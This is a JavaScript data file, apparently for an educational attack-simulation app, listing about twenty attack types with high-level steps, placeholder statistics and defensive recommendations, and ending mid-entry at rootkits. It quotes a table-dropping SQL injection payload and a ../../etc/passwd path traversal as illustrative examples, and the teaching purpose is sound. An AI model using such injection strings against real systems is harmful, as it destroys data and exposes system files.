'use strict';

const ATTACKS = [
    {
        id: 'ddos',
        name: 'DDoS Attack',
        icon: '🌊',
        category: 'network',
        severity: 'critical',
        tags: ['volumetric', 'flood', 'botnet', 'availability'],
        description: 'A Distributed Denial of Service (DDoS) attack overwhelms a target server by flooding it with massive traffic from thousands of compromised machines (a botnet), making the service unavailable to legitimate users.',
        accent: '#ff3b3b',
        accentDim: 'rgba(255,59,59,0.15)',
        steps: [
            { title: 'Botnet Activation', desc: 'Attacker sends command to infected zombie machines worldwide.' },
            { title: 'Traffic Amplification', desc: 'Each bot generates thousands of requests per second.' },
            { title: 'Server Overwhelmed', desc: 'Target server CPU and bandwidth reach 100% capacity.' },
            { title: 'Service Disruption', desc: 'Legitimate users are unable to access the service.' },
            { title: 'Attack Sustained', desc: 'Botnet maintains flood until manually mitigated.' },
        ],
        stats: [
            { label: 'Requests/sec', value: '0', live: true },
            { label: 'Bots Active', value: '0', live: true },
            { label: 'Bandwidth Used', value: '0 Gbps', live: false },
            { label: 'Server Load', value: '0%', live: false },
        ],
        defense: [
            'Deploy a Content Delivery Network (CDN) with DDoS protection.',
            'Use rate limiting and IP-based traffic filtering.',
            'Implement anycast network diffusion to absorb traffic.',
            'Configure auto-scaling to handle traffic spikes.',
            'Enable blackhole routing for malicious IP ranges.',
        ],
        simulate: 'simulateDDoS',
    },
    {
        id: 'phishing',
        name: 'Phishing Attack',
        icon: '🎣',
        category: 'social',
        severity: 'high',
        tags: ['email', 'social-engineering', 'credential-theft', 'deception'],
        description: 'Phishing attacks trick users into revealing credentials or installing malware by impersonating trusted entities via fraudulent emails, SMS (smishing), or websites that look identical to legitimate ones.',
        accent: '#ffaa00',
        accentDim: 'rgba(255,170,0,0.15)',
        steps: [
            { title: 'Target Reconnaissance', desc: 'Attacker researches target\'s trusted services and contacts.' },
            { title: 'Fake Email Crafted', desc: 'Spoofed email mimics legitimate service (e.g., bank, IT).' },
            { title: 'Email Delivered', desc: 'Victim receives email with urgent call-to-action link.' },
            { title: 'Fake Login Page', desc: 'Victim clicks link — lands on a convincing clone site.' },
            { title: 'Credentials Harvested', desc: 'Login credentials are stolen and sent to attacker server.' },
        ],
        stats: [
            { label: 'Emails Sent', value: '0', live: true },
            { label: 'Click Rate', value: '0%', live: false },
            { label: 'Credentials Stolen', value: '0', live: true },
            { label: 'Success Rate', value: '~34%', live: false },
        ],
        defense: [
            'Enable Multi-Factor Authentication (MFA) on all accounts.',
            'Train employees to identify phishing indicators.',
            'Use email authentication (SPF, DKIM, DMARC).',
            'Deploy an email security gateway with link analysis.',
            'Verify URLs manually before entering any credentials.',
        ],
        simulate: 'simulatePhishing',
    },
    {
        id: 'sql',
        name: 'SQL Injection',
        icon: '💉',
        category: 'web',
        severity: 'critical',
        tags: ['injection', 'database', 'owasp-top-10', 'data-breach'],
        description: 'SQL Injection (SQLi) exploits vulnerabilities in web application database queries by inserting malicious SQL code into input fields, allowing attackers to read, modify, or delete database contents.',
        accent: '#00f0ff',
        accentDim: 'rgba(0,240,255,0.15)',
        steps: [
            { title: 'Vulnerability Discovery', desc: 'Attacker finds an unsanitized input field on the web app.' },
            { title: 'Payload Crafted', desc: 'SQL payload constructed: \' OR 1=1; DROP TABLE users; --' },
            { title: 'Query Injected', desc: 'Malicious SQL merges with the application\'s database query.' },
            { title: 'Database Exposed', desc: 'All user records, passwords, and PII extracted.' },
            { title: 'Data Exfiltrated', desc: 'Attacker downloads full database via automated tools.' },
        ],
        stats: [
            { label: 'Queries Tested', value: '0', live: true },
            { label: 'Payloads', value: '0', live: true },
            { label: 'Records Leaked', value: '0', live: true },
            { label: 'Tables Exposed', value: '0', live: true },
        ],
        defense: [
            'Use parameterized queries / prepared statements exclusively.',
            'Apply strict input validation and sanitization.',
            'Employ a Web Application Firewall (WAF).',
            'Grant minimal database privileges (least privilege).',
            'Enable database activity monitoring and alerting.',
        ],
        simulate: 'simulateSQLi',
    },
    {
        id: 'xss',
        name: 'Cross-Site Scripting',
        icon: '📜',
        category: 'web',
        severity: 'high',
        tags: ['xss', 'javascript', 'owasp-top-10', 'session-hijack'],
        description: 'XSS attacks inject malicious scripts into web pages viewed by other users. Stored XSS persists in the database, reflected XSS is URL-based, and DOM-based XSS manipulates the client-side environment.',
        accent: '#8b5cf6',
        accentDim: 'rgba(139,92,246,0.15)',
        steps: [
            { title: 'Payload Injection', desc: 'Attacker submits script payload in a vulnerable form field.' },
            { title: 'Script Stored', desc: 'Server stores malicious script without sanitization.' },
            { title: 'Victim Loads Page', desc: 'Victim\'s browser executes the stored malicious script.' },
            { title: 'Session Hijacked', desc: 'Script sends victim\'s session cookies to attacker.' },
            { title: 'Account Compromised', desc: 'Attacker uses stolen cookies to impersonate the victim.' },
        ],
        stats: [
            { label: 'Scripts Injected', value: '0', live: true },
            { label: 'Users Affected', value: '0', live: true },
            { label: 'Cookies Stolen', value: '0', live: true },
            { label: 'Sessions Hijacked', value: '0', live: true },
        ],
        defense: [
            'Implement Content Security Policy (CSP) headers.',
            'Sanitize and encode all user-supplied data before output.',
            'Use HttpOnly and Secure flags on session cookies.',
            'Validate all inputs on both client and server side.',
            'Employ modern frameworks that auto-escape by default.',
        ],
        simulate: 'simulateXSS',
    },
    {
        id: 'ransomware',
        name: 'Ransomware',
        icon: '🔐',
        category: 'malware',
        severity: 'critical',
        tags: ['encryption', 'extortion', 'malware', 'file-system'],
        description: 'Ransomware encrypts a victim\'s files using strong cryptographic algorithms (e.g., AES-256 + RSA-2048), making them inaccessible, then demands a ransom payment (usually cryptocurrency) for the decryption key.',
        accent: '#ff3b3b',
        accentDim: 'rgba(255,59,59,0.15)',
        steps: [
            { title: 'Initial Infection', desc: 'Malware delivered via phishing email attachment or exploit kit.' },
            { title: 'C2 Communication', desc: 'Ransomware contacts command & control server for encryption key.' },
            { title: 'File Enumeration', desc: 'Scans all drives for documents, databases, and media files.' },
            { title: 'Encryption Begins', desc: 'Files encrypted with AES-256; key encrypted with RSA-2048.' },
            { title: 'Ransom Demanded', desc: 'Ransom note displayed. Victim has 72h to pay or lose data.' },
        ],
        stats: [
            { label: 'Files Encrypted', value: '0', live: true },
            { label: 'Data Encrypted', value: '0 GB', live: false },
            { label: 'Ransom Demand', value: '$0', live: false },
            { label: 'Time Elapsed', value: '0s', live: false },
        ],
        defense: [
            'Maintain offline, air-gapped backups of all critical data.',
            'Keep OS and applications fully patched and up-to-date.',
            'Never open email attachments from unknown senders.',
            'Use endpoint detection and response (EDR) tools.',
            'Implement network segmentation to limit lateral movement.',
        ],
        simulate: 'simulateRansomware',
    },
    {
        id: 'bruteforce',
        name: 'Brute Force Attack',
        icon: '🔨',
        category: 'network',
        severity: 'high',
        tags: ['password', 'credential-stuffing', 'dictionary', 'authentication'],
        description: 'A brute force attack systematically tries every possible password combination (or a dictionary of common passwords) until the correct one is found, exploiting weak authentication mechanisms.',
        accent: '#ffaa00',
        accentDim: 'rgba(255,170,0,0.15)',
        steps: [
            { title: 'Target Identified', desc: 'Login endpoint identified (SSH, RDP, web admin panel).' },
            { title: 'Wordlist Loaded', desc: 'Attacker loads a dictionary of millions of common passwords.' },
            { title: 'Automated Testing', desc: 'Tool fires thousands of login attempts per second.' },
            { title: 'Password Found', desc: 'Weak password matched after N attempts.' },
            { title: 'Unauthorized Access', desc: 'Attacker logs in with compromised credentials.' },
        ],
        stats: [
            { label: 'Attempts Made', value: '0', live: true },
            { label: 'Attempts/sec', value: '0', live: true },
            { label: 'Failed Logins', value: '0', live: true },
            { label: 'Accounts Cracked', value: '0', live: true },
        ],
        defense: [
            'Enforce account lockout after 3-5 failed attempts.',
            'Require strong, complex passwords (12+ characters).',
            'Implement CAPTCHA on login forms.',
            'Enable Multi-Factor Authentication (MFA).',
            'Monitor and alert on unusual login activity patterns.',
        ],
        simulate: 'simulateBruteForce',
    },
    {
        id: 'mitm',
        name: 'Man-in-the-Middle',
        icon: '👁️',
        category: 'network',
        severity: 'high',
        tags: ['eavesdropping', 'interception', 'arp-spoofing', 'ssl-strip'],
        description: 'A Man-in-the-Middle (MitM) attack secretly intercepts and relays communications between two parties, allowing the attacker to eavesdrop, steal data, or inject malicious content into the communication stream.',
        accent: '#3b82f6',
        accentDim: 'rgba(59,130,246,0.15)',
        steps: [
            { title: 'ARP Spoofing', desc: 'Attacker sends fake ARP replies to associate their MAC with victim IP.' },
            { title: 'Position Established', desc: 'All victim traffic now routes through the attacker\'s machine.' },
            { title: 'Traffic Interception', desc: 'Attacker reads plaintext HTTP data in real-time.' },
            { title: 'SSL Stripping', desc: 'HTTPS downgraded to HTTP to bypass encryption.' },
            { title: 'Data Harvested', desc: 'Credentials, session tokens, and PII captured silently.' },
        ],
        stats: [
            { label: 'Packets Intercepted', value: '0', live: true },
            { label: 'Credentials Sniffed', value: '0', live: true },
            { label: 'Data Volume', value: '0 MB', live: false },
            { label: 'Session Tokens', value: '0', live: true },
        ],
        defense: [
            'Always use HTTPS; enforce HSTS (HTTP Strict Transport Security).',
            'Use VPN on public or untrusted networks.',
            'Enable certificate pinning in mobile applications.',
            'Monitor ARP tables for unexpected changes.',
            'Use network intrusion detection systems (NIDS).',
        ],
        simulate: 'simulateMitM',
    },
    {
        id: 'zeroday',
        name: 'Zero-Day Exploit',
        icon: '💥',
        category: 'malware',
        severity: 'critical',
        tags: ['exploit', 'vulnerability', 'patch', 'APT'],
        description: 'A zero-day exploit targets a previously unknown software vulnerability, giving defenders zero days to patch before the attacker can leverage it. These are highly valuable and often used by nation-state actors.',
        accent: '#ff00aa',
        accentDim: 'rgba(255,0,170,0.15)',
        steps: [
            { title: 'Vulnerability Research', desc: 'Security researcher or attacker discovers unknown flaw in software.' },
            { title: 'Exploit Developed', desc: 'Proof-of-concept code crafted to trigger the vulnerability.' },
            { title: 'Silent Deployment', desc: 'Exploit delivered via watering hole, email, or supply chain.' },
            { title: 'System Compromised', desc: 'Attacker gains system-level or root access silently.' },
            { title: 'Persistence Installed', desc: 'Backdoor or rootkit installed; attacker maintains long-term access.' },
        ],
        stats: [
            { label: 'CVE Score', value: '9.8 / 10', live: false },
            { label: 'Systems at Risk', value: '0', live: true },
            { label: 'Patches Available', value: '0', live: false },
            { label: 'Time to Detect', value: '>200 days avg', live: false },
        ],
        defense: [
            'Apply security patches within 24 hours of release.',
            'Use behavior-based EDR tools to detect anomalous activity.',
            'Deploy exploit mitigation tech (ASLR, DEP, CFG).',
            'Implement zero-trust architecture to limit blast radius.',
            'Perform regular threat hunting and penetration testing.',
        ],
        simulate: 'simulateZeroDay',
    },
    {
        id: 'dns',
        name: 'DNS Spoofing',
        icon: '🌐',
        category: 'network',
        severity: 'high',
        tags: ['dns', 'cache-poisoning', 'redirect', 'spoofing'],
        description: 'DNS spoofing (cache poisoning) corrupts a DNS resolver\'s cache with fraudulent DNS records, redirecting users from legitimate websites to attacker-controlled servers without the user\'s knowledge.',
        accent: '#39ff14',
        accentDim: 'rgba(57,255,20,0.15)',
        steps: [
            { title: 'DNS Query Observed', desc: 'Victim\'s machine queries DNS resolver for a website IP.' },
            { title: 'Resolver Targeted', desc: 'Attacker floods resolver with forged DNS response packets.' },
            { title: 'Cache Poisoned', desc: 'Fake IP stored in resolver cache; legitimate users affected.' },
            { title: 'Traffic Redirected', desc: 'All requests for target domain routed to attacker\'s server.' },
            { title: 'Credentials Harvested', desc: 'Victims unknowingly submit credentials to fake site.' },
        ],
        stats: [
            { label: 'Forged Packets', value: '0', live: true },
            { label: 'Cache Entries', value: '0', live: true },
            { label: 'Users Redirected', value: '0', live: true },
            { label: 'TTL Remaining', value: '300s', live: false },
        ],
        defense: [
            'Enable DNSSEC to validate DNS record authenticity.',
            'Use trusted, encrypted DNS resolvers (DNS-over-HTTPS).',
            'Implement source port randomization on DNS resolvers.',
            'Monitor DNS traffic for anomalous response patterns.',
            'Configure short TTL values on critical DNS records.',
        ],
        simulate: 'simulateDNSSpoofing',
    },
    {
        id: 'arp',
        name: 'ARP Poisoning',
        icon: '☠️',
        category: 'network',
        severity: 'medium',
        tags: ['arp', 'layer-2', 'lan', 'poisoning'],
        description: 'ARP Poisoning sends falsified ARP (Address Resolution Protocol) messages over a local area network, linking the attacker\'s MAC address to the IP address of a legitimate device to intercept network traffic.',
        accent: '#00f0ff',
        accentDim: 'rgba(0,240,255,0.15)',
        steps: [
            { title: 'Network Scanning', desc: 'Attacker discovers IP and MAC addresses on the local network.' },
            { title: 'ARP Replies Forged', desc: 'Gratuitous ARP packets sent to victim and gateway.' },
            { title: 'ARP Cache Updated', desc: 'Victim associates gateway IP with attacker\'s MAC address.' },
            { title: 'Traffic Intercepted', desc: 'All victim-to-gateway traffic flows through attacker.' },
            { title: 'Data Manipulated', desc: 'Attacker reads, modifies, or drops network packets.' },
        ],
        stats: [
            { label: 'ARP Packets Sent', value: '0', live: true },
            { label: 'Hosts Poisoned', value: '0', live: true },
            { label: 'Traffic Intercepted', value: '0 KB', live: false },
            { label: 'Duration', value: '0s', live: false },
        ],
        defense: [
            'Use Dynamic ARP Inspection (DAI) on managed switches.',
            'Implement static ARP entries for critical hosts.',
            'Use VLANs to segment network traffic.',
            'Deploy network monitoring tools (e.g., XArp, Wireshark).',
            'Encrypt all sensitive communications using TLS/VPN.',
        ],
        simulate: 'simulateARPPoison',
    },
    {
        id: 'social',
        name: 'Social Engineering',
        icon: '🎭',
        category: 'social',
        severity: 'high',
        tags: ['pretexting', 'vishing', 'impersonation', 'human-factor'],
        description: 'Social engineering manipulates people into divulging confidential information or performing actions that compromise security. It exploits human psychology rather than technical vulnerabilities.',
        accent: '#ffaa00',
        accentDim: 'rgba(255,170,0,0.15)',
        steps: [
            { title: 'Target Research', desc: 'Attacker researches victim on LinkedIn, social media, and company site.' },
            { title: 'Pretext Crafted', desc: 'Believable scenario created (e.g., IT support, new vendor, executive).' },
            { title: 'Initial Contact', desc: 'Attacker contacts victim by phone, email, or in person.' },
            { title: 'Trust Established', desc: 'Victim believes attacker is legitimate; guard is lowered.' },
            { title: 'Information Extracted', desc: 'Victim reveals passwords, access codes, or sensitive data.' },
        ],
        stats: [
            { label: 'Attack Vectors', value: '5', live: false },
            { label: 'Targets Contacted', value: '0', live: true },
            { label: 'Trust Established', value: '0', live: true },
            { label: 'Data Extracted', value: '0', live: true },
        ],
        defense: [
            'Conduct regular security awareness training for all staff.',
            'Implement strict caller verification procedures.',
            'Establish a security culture where questioning is encouraged.',
            'Never share passwords verbally, even with "IT support."',
            'Report suspicious contacts to the security team immediately.',
        ],
        simulate: 'simulateSocialEngineering',
    },
    {
        id: 'insider',
        name: 'Insider Threat',
        icon: '🕵️',
        category: 'malware',
        severity: 'critical',
        tags: ['insider', 'privilege-abuse', 'data-theft', 'espionage'],
        description: 'Insider threats involve malicious or negligent actions by current/former employees, contractors, or partners who misuse their authorized access to damage systems, steal data, or sabotage operations.',
        accent: '#ff3b3b',
        accentDim: 'rgba(255,59,59,0.15)',
        steps: [
            { title: 'Authorized Access', desc: 'Insider uses legitimate credentials to access sensitive systems.' },
            { title: 'Privilege Escalation', desc: 'Exploits role permissions to access restricted resources.' },
            { title: 'Data Exfiltration', desc: 'Copies files to USB drive, personal email, or cloud storage.' },
            { title: 'Evidence Destruction', desc: 'Deletes or modifies audit logs to cover tracks.' },
            { title: 'Exfiltration Complete', desc: 'Sensitive IP, PII, or trade secrets sent to competitors/adversaries.' },
        ],
        stats: [
            { label: 'Systems Accessed', value: '0', live: true },
            { label: 'Files Exfiltrated', value: '0', live: true },
            { label: 'Data Volume', value: '0 MB', live: false },
            { label: 'Avg Detection Time', value: '77 days', live: false },
        ],
        defense: [
            'Enforce least privilege access and role-based access control.',
            'Implement User and Entity Behavior Analytics (UEBA).',
            'Monitor file access logs and data egress patterns.',
            'Conduct background checks and periodic security reviews.',
            'Implement Data Loss Prevention (DLP) solutions.',
        ],
        simulate: 'simulateInsiderThreat',
    },
    {
        id: 'password',
        name: 'Password Attack',
        icon: '🔑',
        category: 'network',
        severity: 'high',
        tags: ['credential-stuffing', 'rainbow-table', 'hash-cracking', 'authentication'],
        description: 'Password attacks use techniques like credential stuffing (leaked credentials from breaches), rainbow table lookups, and hybrid attacks to crack hashed passwords or bypass authentication at scale.',
        accent: '#ffaa00',
        accentDim: 'rgba(255,170,0,0.15)',
        steps: [
            { title: 'Credential Dump Obtained', desc: 'Attacker acquires leaked password database from dark web.' },
            { title: 'Hash Analysis', desc: 'Password hashes extracted and identified (MD5, SHA1, bcrypt).' },
            { title: 'Rainbow Table Lookup', desc: 'Precomputed hash tables used to reverse weak password hashes.' },
            { title: 'Credential Stuffing', desc: 'Valid credential pairs tested across multiple services.' },
            { title: 'Account Takeover', desc: 'Matched credentials used to access accounts across platforms.' },
        ],
        stats: [
            { label: 'Hashes Analyzed', value: '0', live: true },
            { label: 'Cracked Passwords', value: '0', live: true },
            { label: 'Sites Tested', value: '0', live: true },
            { label: 'Accounts Taken', value: '0', live: true },
        ],
        defense: [
            'Always salt and use bcrypt/Argon2 for password hashing.',
            'Enable credential breach monitoring (HaveIBeenPwned API).',
            'Force password rotation after any known breach.',
            'Implement MFA to make stolen passwords useless.',
            'Use a password manager to generate strong unique passwords.',
        ],
        simulate: 'simulatePasswordAttack',
    },
    {
        id: 'urlinterpret',
        name: 'URL Interpretation',
        icon: '🔗',
        category: 'web',
        severity: 'medium',
        tags: ['url-manipulation', 'path-traversal', 'directory-listing', 'owasp'],
        description: 'URL interpretation attacks manipulate web application URLs to access unauthorized resources. Techniques include directory traversal (../), parameter tampering, forced browsing, and path injection to bypass access controls.',
        accent: '#3b82f6',
        accentDim: 'rgba(59,130,246,0.15)',
        steps: [
            { title: 'URL Structure Analysis', desc: 'Attacker studies URL patterns to understand backend structure.' },
            { title: 'Path Traversal Attempt', desc: 'Manipulates ../../etc/passwd to escape web root.' },
            { title: 'Parameter Tampering', desc: 'Changes ?user_id=1001 to ?user_id=1 to access admin data.' },
            { title: 'Forced Browsing', desc: 'Directly accesses /admin, /backup, /config without auth.' },
            { title: 'Sensitive Data Exposed', desc: 'Config files, user data, or source code retrieved.' },
        ],
        stats: [
            { label: 'URLs Probed', value: '0', live: true },
            { label: 'Paths Traversed', value: '0', live: true },
            { label: 'Files Accessed', value: '0', live: true },
            { label: 'Auth Bypasses', value: '0', live: true },
        ],
        defense: [
            'Validate and sanitize all URL parameters server-side.',
            'Disable directory listing on web servers.',
            'Implement proper access control on all endpoints.',
            'Use allowlist-based input validation for file paths.',
            'Configure web server to restrict traversal outside web root.',
        ],
        simulate: 'simulateURLInterpretation',
    },
    {
        id: 'sessionhijack',
        name: 'Session Hijacking',
        icon: '🎫',
        category: 'web',
        severity: 'high',
        tags: ['session-token', 'cookie-theft', 'fixation', 'sidejacking'],
        description: 'Session hijacking steals or forges a user\'s session token to impersonate them without credentials. Methods include XSS cookie theft, network sniffing, session fixation, and sidejacking on unencrypted connections.',
        accent: '#8b5cf6',
        accentDim: 'rgba(139,92,246,0.15)',
        steps: [
            { title: 'Session Token Identified', desc: 'Target\'s session cookie or token observed via network sniff.' },
            { title: 'Token Captured', desc: 'Session token extracted from HTTP headers or cookies.' },
            { title: 'Token Replayed', desc: 'Attacker injects stolen token into their own browser.' },
            { title: 'Identity Assumed', desc: 'Server accepts replayed token — attacker is now logged in.' },
            { title: 'Account Exploited', desc: 'Attacker performs actions as the victim user.' },
        ],
        stats: [
            { label: 'Sessions Monitored', value: '0', live: true },
            { label: 'Tokens Captured', value: '0', live: true },
            { label: 'Replays Attempted', value: '0', live: true },
            { label: 'Hijacks Successful', value: '0', live: true },
        ],
        defense: [
            'Regenerate session tokens after login and privilege escalation.',
            'Set Secure + HttpOnly + SameSite flags on session cookies.',
            'Bind sessions to IP/User-Agent to detect token theft.',
            'Implement short session timeouts with re-authentication.',
            'Use HTTPS everywhere to prevent network sniffing.',
        ],
        simulate: 'simulateSessionHijack',
    },
    {
        id: 'trojan',
        name: 'Trojan Horse',
        icon: '🐴',
        category: 'malware',
        severity: 'critical',
        tags: ['trojan', 'backdoor', 'rat', 'disguise'],
        description: 'Trojan horses disguise malicious code as legitimate software to trick users into installing them. Once executed, they establish backdoors, exfiltrate data, or download additional malware while appearing harmless to the user.',
        accent: '#ff3b3b',
        accentDim: 'rgba(255,59,59,0.15)',
        steps: [
            { title: 'Malware Disguised', desc: 'Trojan packaged as legitimate app (game, PDF viewer, crack).' },
            { title: 'Victim Installs', desc: 'User downloads and executes the trojanized software.' },
            { title: 'Backdoor Opened', desc: 'Trojan silently opens a reverse shell to attacker\'s C2 server.' },
            { title: 'System Surveilled', desc: 'Keystrokes, screenshots, and files collected without user knowledge.' },
            { title: 'Payload Delivered', desc: 'Secondary malware (ransomware, botnet agent) downloaded and executed.' },
        ],
        stats: [
            { label: 'C2 Connections', value: '0', live: true },
            { label: 'Files Stolen', value: '0', live: true },
            { label: 'Keystrokes Logged', value: '0', live: true },
            { label: 'Payload Downloads', value: '0', live: true },
        ],
        defense: [
            'Download software only from official, verified sources.',
            'Use reputable antivirus/EDR with behavioral detection.',
            'Never disable security software to install applications.',
            'Inspect code before execution (code signing).',
            'Monitor outbound network connections for C2 beaconing.',
        ],
        simulate: 'simulateTrojan',
    },
    {
        id: 'driveby',
        name: 'Drive-by Download',
        icon: '🚗',
        category: 'web',
        severity: 'high',
        tags: ['browser-exploit', 'exploit-kit', 'watering-hole', 'malvertising'],
        description: 'Drive-by download attacks silently install malware when a user merely visits a compromised or malicious website — no user interaction required. Exploit kits probe browser and plugin vulnerabilities to deliver payloads automatically.',
        accent: '#ff00aa',
        accentDim: 'rgba(255,0,170,0.15)',
        steps: [
            { title: 'Malicious Page Loaded', desc: 'Victim browses a compromised or malvertising-infected page.' },
            { title: 'Browser Fingerprinted', desc: 'Exploit kit probes OS, browser version, and plugin vulnerabilities.' },
            { title: 'Exploit Triggered', desc: 'Vulnerable component (Flash, PDF, JS engine) exploited silently.' },
            { title: 'Payload Dropped', desc: 'Malware silently downloaded and written to disk without prompts.' },
            { title: 'Malware Executes', desc: 'Payload runs with browser privileges; system compromised.' },
        ],
        stats: [
            { label: 'Pages Visited', value: '0', live: true },
            { label: 'Exploits Attempted', value: '0', live: true },
            { label: 'Payloads Dropped', value: '0', live: true },
            { label: 'Systems Infected', value: '0', live: true },
        ],
        defense: [
            'Keep browsers and all plugins fully updated.',
            'Use ad-blockers and disable unnecessary browser plugins.',
            'Enable browser sandboxing and click-to-play for plugins.',
            'Use DNS filtering to block known malicious domains.',
            'Deploy endpoint protection with exploit mitigation.',
        ],
        simulate: 'simulateDriveBy',
    },
    {
        id: 'eavesdropping',
        name: 'Eavesdropping',
        icon: '👂',
        category: 'network',
        severity: 'medium',
        tags: ['sniffing', 'packet-capture', 'wireshark', 'passive'],
        description: 'Eavesdropping (network sniffing) passively captures network traffic to extract sensitive data from unencrypted communications. Unlike active attacks, it leaves no trace on targeted systems and is extremely difficult to detect.',
        accent: '#39ff14',
        accentDim: 'rgba(57,255,20,0.15)',
        steps: [
            { title: 'NIC Promiscuous Mode', desc: 'Attacker sets network card to capture all passing frames.' },
            { title: 'Packet Capture Started', desc: 'Tool (Wireshark/tcpdump) records all network traffic.' },
            { title: 'Protocol Analysis', desc: 'HTTP, FTP, Telnet traffic analyzed for plaintext credentials.' },
            { title: 'Data Extraction', desc: 'Passwords, emails, and session tokens extracted from captures.' },
            { title: 'Offline Analysis', desc: 'Captured data analyzed at leisure without detection risk.' },
        ],
        stats: [
            { label: 'Packets Captured', value: '0', live: true },
            { label: 'Credentials Found', value: '0', live: true },
            { label: 'Data Volume', value: '0 MB', live: false },
            { label: 'Protocols Sniffed', value: '0', live: true },
        ],
        defense: [
            'Encrypt all network communications (TLS 1.3, WPA3).',
            'Avoid using legacy plaintext protocols (FTP, Telnet, HTTP).',
            'Use network switches instead of hubs to limit broadcast.',
            'Implement 802.1X port-based authentication on LANs.',
            'Monitor for promiscuous mode NICs on the network.',
        ],
        simulate: 'simulateEavesdropping',
    },
    {
        id: 'birthday',
        name: 'Birthday Attack',
        icon: '🎂',
        category: 'web',
        severity: 'medium',
        tags: ['cryptography', 'hash-collision', 'md5', 'probability'],
        description: 'A birthday attack exploits the mathematics of the birthday paradox to find hash collisions faster than brute force. It\'s used to forge digital signatures, break weak hash functions (MD5, SHA-1), and create malicious certificate duplicates.',
        accent: '#ff00aa',
        accentDim: 'rgba(255,0,170,0.15)',
        steps: [
            { title: 'Hash Function Targeted', desc: 'Attacker identifies weak hash algorithm in use (MD5, SHA-1).' },
            { title: 'Random Inputs Generated', desc: 'Millions of random messages computed and hashed.' },
            { title: 'Collision Search', desc: 'Birthday paradox: collision found after ~√N computations.' },
            { title: 'Collision Found', desc: 'Two different inputs with identical hashes discovered.' },
            { title: 'Signature Forged', desc: 'Digital signature or certificate forged using the collision.' },
        ],
        stats: [
            { label: 'Hashes Computed', value: '0', live: true },
            { label: 'Collisions Found', value: '0', live: true },
            { label: 'Hash Space', value: '2^128 bits', live: false },
            { label: 'Forge Success', value: '0%', live: false },
        ],
        defense: [
            'Use SHA-256 or stronger hash functions.',
            'Migrate away from MD5 and SHA-1 immediately.',
            'Use digital signatures with collision-resistant algorithms.',
            'Implement certificate transparency to detect forged certs.',
            'Regularly audit cryptographic implementations for weaknesses.',
        ],
        simulate: 'simulateBirthdayAttack',
    },
    {
        id: 'malware',
        name: 'Malware Infection',
        icon: '🦠',
        category: 'malware',
        severity: 'critical',
        tags: ['worm', 'virus', 'spyware', 'payload'],
        description: 'Malware (malicious software) encompasses viruses, worms, spyware, and adware that self-replicate, spread laterally, and cause damage. Unlike targeted attacks, malware campaigns propagate automatically across networks seeking vulnerable hosts.',
        accent: '#ff3b3b',
        accentDim: 'rgba(255,59,59,0.15)',
        steps: [
            { title: 'Initial Infection Vector', desc: 'Malware enters via email, USB, exploited vulnerability.' },
            { title: 'Self-Replication', desc: 'Worm/virus copies itself to other files or network shares.' },
            { title: 'Lateral Movement', desc: 'Spreads to adjacent networked systems automatically.' },
            { title: 'Payload Activation', desc: 'Destructive payload: data corruption, crypto-mining, exfil.' },
            { title: 'Propagation', desc: 'Infected systems become vectors — spreading further.' },
        ],
        stats: [
            { label: 'Systems Infected', value: '0', live: true },
            { label: 'Files Corrupted', value: '0', live: true },
            { label: 'Network Spread', value: '0', live: true },
            { label: 'Propagation Speed', value: '0/s', live: false },
        ],
        defense: [
            'Deploy enterprise antivirus with real-time protection.',
            'Segment networks to prevent lateral movement.',
            'Disable autorun for removable media.',
            'Keep all software and OS patches current.',
            'Use application whitelisting to block unauthorized code.',
        ],
        simulate: 'simulateMalware',
    },
    {
        id: 'honeypot',
        name: 'Honeypot Trap',
        icon: '🍯',
        category: 'network',
        severity: 'low',
        tags: ['deception', 'threat-intel', 'honeypot', 'detection'],
        description: 'A honeypot is a deliberately vulnerable decoy system designed to lure attackers, observe their techniques, and gather threat intelligence — without exposing real assets. Honeynets extend this concept to entire fake network segments.',
        accent: '#ffaa00',
        accentDim: 'rgba(255,170,0,0.15)',
        steps: [
            { title: 'Decoy Deployed', desc: 'Honeypot server appears as a vulnerable, attractive target.' },
            { title: 'Attacker Detected', desc: 'Any connection to honeypot triggers immediate alert.' },
            { title: 'Attack Profiled', desc: 'Attacker\'s tools, techniques, and IPs logged silently.' },
            { title: 'Threat Intel Gathered', desc: 'Attack patterns analyzed and fed into security systems.' },
            { title: 'Attacker Contained', desc: 'Attacker wasted on fake system; real assets remain safe.' },
        ],
        stats: [
            { label: 'Connections Lured', value: '0', live: true },
            { label: 'Attack Patterns', value: '0', live: true },
            { label: 'IPs Captured', value: '0', live: true },
            { label: 'Real Assets Safe', value: '100%', live: false },
        ],
        defense: [
            'Deploy honeypots across network segments as early warning.',
            'Use high-interaction honeypots to gather rich attacker data.',
            'Integrate honeypot alerts into your SIEM system.',
            'Position honeypots alongside real assets for credibility.',
            'Analyze honeypot logs regularly to update threat intelligence.',
        ],
        simulate: 'simulateHoneypot',
    },
    {
        id: 'reverseeng',
        name: 'Reverse Engineering',
        icon: '🔬',
        category: 'malware',
        severity: 'medium',
        tags: ['disassembly', 'decompilation', 'binary-analysis', 'debugging'],
        description: 'Reverse engineering analyzes software binaries to understand internal logic, discover vulnerabilities, bypass license checks, or extract proprietary algorithms — without access to source code. Used by both security researchers and malicious actors.',
        accent: '#00f0ff',
        accentDim: 'rgba(0,240,255,0.15)',
        steps: [
            { title: 'Binary Acquired', desc: 'Target executable or firmware image obtained for analysis.' },
            { title: 'Static Analysis', desc: 'Strings, imports, and headers examined with tools like Ghidra.' },
            { title: 'Disassembly', desc: 'Machine code decompiled to assembly and pseudo-C code.' },
            { title: 'Logic Mapped', desc: 'Authentication flows, encryption keys, and APIs identified.' },
            { title: 'Exploit Crafted', desc: 'Vulnerabilities or bypass discovered and weaponized.' },
        ],
        stats: [
            { label: 'Functions Analyzed', value: '0', live: true },
            { label: 'Vulnerabilities Found', value: '0', live: true },
            { label: 'Code Coverage', value: '0%', live: false },
            { label: 'Strings Extracted', value: '0', live: true },
        ],
        defense: [
            'Use code obfuscation and anti-debugging techniques.',
            'Implement software tamper detection and integrity checks.',
            'Apply binary packing to slow automated analysis.',
            'Use license server verification for critical software.',
            'Conduct regular threat modeling and security audits.',
        ],
        simulate: 'simulateReverseEngineering',
    },
    {
        id: 'rootkit',
        name: 'Rootkit',
        icon: '👻',
        category: 'malware',
        severity: 'critical',
        tags: ['persistence', 'stealth', 'kernel', 'ring0'],
        description: 'Rootkits operate at the deepest level of the operating system (kernel/ring-0) to hide their presence from security tools, users, and the OS itself. They intercept system calls to conceal files, processes, network connections, and registry keys.',
        accent: '#ff3b3b',
        accentDim: 'rgba(255,59,59,0.15)',
        steps: [
